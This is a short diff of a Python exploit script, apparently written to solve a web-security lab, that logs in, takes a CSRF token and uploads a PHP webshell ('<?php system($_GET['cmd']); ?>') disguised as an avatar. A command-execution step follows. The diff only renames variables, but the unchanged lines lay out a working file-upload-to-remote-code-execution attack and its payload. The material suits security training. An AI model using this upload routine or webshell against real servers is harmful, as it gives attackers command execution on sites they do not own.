@@ -24,8 +24,8 @@ def login():
 
 
 def upload_file():
-   response_one = requests.get(f"{lab_url}/my-account", cookies={"session": cookie})
-   csrf_token = extract_csrf_token(response_one)
+   response = requests.get(f"{lab_url}/my-account", cookies={"session": cookie})
+   csrf_token = extract_csrf_token(response)
 
    file = {
         "avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
@@ -36,8 +36,8 @@ def upload_file():
         "csrf": csrf_token,
     }
 
-   response_two = requests.post(f"{lab_url}/my-account/avatar", cookies={"session": cookie}, files=file, data=data)
-   return response_two
+   requests.post(f"{lab_url}/my-account/avatar", cookies={"session": cookie}, files=file, data=data)
+
 
 
 def execute_command():
